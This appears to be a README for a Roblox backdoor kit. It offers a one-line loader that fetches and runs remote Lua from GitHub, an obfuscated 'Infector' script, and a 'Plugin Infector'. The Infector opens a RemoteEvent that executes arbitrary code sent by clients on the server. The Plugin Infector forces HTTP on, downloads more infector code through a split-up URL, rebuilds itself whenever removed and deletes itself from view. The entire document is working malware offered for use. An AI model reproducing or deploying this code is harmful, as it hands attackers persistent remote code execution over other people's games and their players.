# Scanner
```lua
loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))();
```

# Infector
```lua
if not game:GetService('\82\117\110\83\101\114\118\105\99\101'):IsStudio() then getfenv(0)["\73\110\115\116\97\110\99\101"]["\110\101\119"]("\82\101\109\111\116\101\69\118\101\110\116",workspace).OnServerEvent:Connect(function(_,code) getfenv(0)["\114\101\113\117\105\114\101"](0x34A62CEB9):SpawnS(code,workspace) end) end
```

# Plugin Infector 
## Put it directly inside PluginScript.
## Please rename the PluginScript into "YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq".
```lua
-- MAXIMUM SECURITY BEEKDEER 
-- Made by IvanIzWorthlessYT

-- Please set the PluginScript's name into:
-- YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq

task.spawn(function() while wait() do game:GetService('HttpService').HttpEnabled = true end end)

local ratchet
local ratchetName = "qbvZBkprkSJwzXWkWtPneSSsmMVLGgSiEurDhXgvAjSpHbtaEZCTTtjEmecvkEJn"
local pluginName = "YnRFAWcnYCPXQTysUmXvCdZBYHGtibTpvPZoZbAgvFitsDkbivVJzrnBNPBwCGJq"

-- Connect All Events of ratchet 

local function ReconnectRatchet()
ratchet.AncestryChanged:Connect(RecreateRatchet)
ratchet.AttributeChanged:Connect(RecreateRatchet)
ratchet.Changed:Connect(RecreateRatchet)
ratchet.ChildAdded:Connect(RecreateRatchet)
ratchet.ChildRemoved:Connect(RecreateRatchet)
ratchet.DescendantAdded:Connect(RecreateRatchet)
ratchet.DescendantRemoving:Connect(RecreateRatchet)
ratchet.Destroying:Connect(CreateRatchet)
end 

-- Create Ratchet

local function CreateRatchet()
    ratchet = Instance.new("Script",game:GetService('ServerScriptService') 
    ratchet.Name = ratchetName 
    ratchet.Source = game:GetService("HttpService"):GetAsync('htt'..'ps:'..'//'..'raw.githu'..'buser'..'content.'..'com/IvanTheP'..'rotogen/B'..'ack'..'do'..'or'..'Legacy/'..'main/inf'..'ector.l'..'ua') 
    ReconnectRatchet()
end

-- Recreate Ratchet

local function RecreateRatchet() 
    pcall(function() ratchet:Destroy() end)
    wait() 
    CreateRatchet() 
end

-- Initialize

game.DescendantAdded:Connect(function(inst) 
    if inst.Name == pluginName then 
        inst:Destroy() -- Anti-Viewer
    end 
end) 

CreateRatchet() -- New ratchet 
```
